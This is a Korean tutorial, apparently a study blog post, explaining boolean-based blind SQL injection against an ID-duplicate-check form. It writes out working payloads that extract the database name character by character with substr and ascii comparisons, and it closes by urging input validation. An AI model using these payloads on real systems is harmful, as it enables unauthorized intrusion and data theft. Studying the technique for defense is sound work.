Blind SQL Injection

UNION 방식과 ERROR Based 방식은 모두 응답 결과가 화면에 나왔다.

DB의 응답 결과가 화면에 보이지 않는 경우, Blind SQL Injection을 할 수 있다.

Blind SQL Injection의 핵심은 참/거짓의 응답결과가 다른 점을 이용하는 것이다.

아이디 중복을 검사하는 창이 대표적이다.

이렇게 ID를 검색하면 중복 여부에 따라 응답 결과가 다르다.

중복을 확인 하려면 DB 에 접근 해야 할 것이고, 쿼리는 다음과 같을 것이다.

SELECT ~~~ FROM ~~~ WHERE  userId = '   ' and ~~~~

여기서 중요한 점은 WHERE userId = ‘ ‘에 사용자의 파라미터가 들어가서 SQL이 실행된다는 것이다.

normaltic' and '1' = '1

항등원을 넣어보면,

이렇게 SQL Injection이 가능한 포인트임을 알 수 있다.

공격 포멧을 만들기 전에,

normaltic' and (1=1) and '1'='1

and를 하나 더 만들어준다.

그 이유는 편리한 수정을 위해서

결과적으로 기본적인 포맷은 이러하다.

normaltic' and (조건) and '1' = '1

이제 우리는 글자 하나 하나를 가져와서 맞는지 비교하는 작업을 할 것이다.

그 전에, SELECT 문을 사용 가능한지 확인해야 한다.

(select 'test') = 'test'

normaltic' and (조건) and '1' = '1

normaltic' and ((select 'test') = 'test') and '1' = '1

select 문의 정상 작동을 확인하였다.

제일 처음 알아내야 할 것은 DB 이름이다.

DB 이름 찾기

select database() 를 사용하면 된다.

1 글자씩 찾아내기 위해 substr( , , )을 사용한다.

substr('test', 1, 1) -> t // test의 첫번째 글자 ('t') 부터  한 글자를 가져오겠다.
substr('test', 2, 1) -> e // test의 두번째 글자 ('e') 부터 한글자를 가져온다.

결과적으로 알아올 db 이름을 찾는 함수인 select database()를 ‘test’ 자리에 넣으면 된다.

normaltic' and (조건) and '1' = '1 // 공격 포멧

substr((DB 이름 찾기), 1, 1) // DB의 이름을 1글자씩 탐색

select database() // DB 이름 찾기

substr((select database()), 1, 1) // DB의 이름을 찾아와서 한 글자씩 탐색

substr((select database()), 1, 1) = 'a' // 찾아온 DB의 이름을 비교

normaltic' and (substr((select database()), 1, 1) = 'a') and '1' = '1  // 공격 포멧과 결합

‘a’는 거짓.

이걸 계속 바꿔줘야 한다. a b c d 이렇게.cj

첫번째 글자가 ‘s’임을 알아냈다.

이걸 하나씩 비교하는게 아니라, 크기 비교를 통해 해결할 수 있다.

ascii(문자) // 문자를 ASCII로 변환해준다.

substr((select database()), 1, 1) // db의 첫 글자

ascii(substr((select database()), 1, 1)) // db의 첫 글자를 ASCII로 변환

ascii(substr((select database()), 1, 1)) > 60 // ASCII 로 변환된 db 첫 글자를 크기 비교

normaltic' and (조건) and '1' = '1

normaltic' and (ascii(substr((select database()), 1, 1)) > 60) and '1' = '1 // 공격 쿼리

결론

Blind SQL Injection은 서버가 내뱉는 단 한 줄의 응답 차이를 단서로 삼아 거대한 데이터베이스를 파헤치는 정밀한 공격 기법이다. 비록 수많은 요청과 비교 과정이 필요하여 시간이 오래 걸린다는 단점이 있지만, 정보가 직접 노출되지 않는 ‘눈먼(Blind)’ 환경에서도 데이터를 탈취할 수 있다는 점에서 매우 위협적이다.

따라서 개발 단계에서부터 사용자 입력값에 대한 철저한 검증과 함께, 응답의 미세한 차이를 통해 내부 구조가 유추되지 않도록 보안 설정을 강화해야 한다.

따라서 개발 단계에서부터 사용자 입력값에 대한 철저한 검증과 함께, 응답의 미세한 차이를 통해 내부 구조가 유추되지 않도록 보안 설정을 강화해야 한다.
